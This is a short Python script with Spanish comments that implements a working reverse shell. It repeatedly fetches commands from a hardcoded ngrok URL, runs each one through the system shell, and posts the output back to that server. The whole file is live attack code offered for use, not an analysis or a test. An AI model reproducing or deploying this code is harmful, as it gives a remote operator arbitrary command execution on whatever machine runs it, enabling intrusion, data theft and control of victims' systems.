import requests
import subprocess

# Configuración del servidor HTTP (ngrok)
URL = "https://8025-167-60-62-81.ngrok-free.app"  # Tu URL de ngrok

def reverse_shell():
    while True:
        try:
            # Obtener comandos desde el servidor
            response = requests.get(f"{URL}/cmd")
            
            if response.status_code == 200:
                cmd = response.text.strip()  # Leer el comando enviado desde el servidor
                
                if cmd.lower() == "exit":
                    break  # Salir si el comando es "exit"
                
                # Ejecutar el comando y capturar la salida
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                
                # Enviar la salida de vuelta al servidor
                requests.post(f"{URL}/output", data={"output": output})
        except Exception as e:
            # En caso de error, esperar antes de intentar de nuevo
            requests.post(f"{URL}/error", data={"error": str(e)})
            break

if __name__ == "__main__":
    reverse_shell()

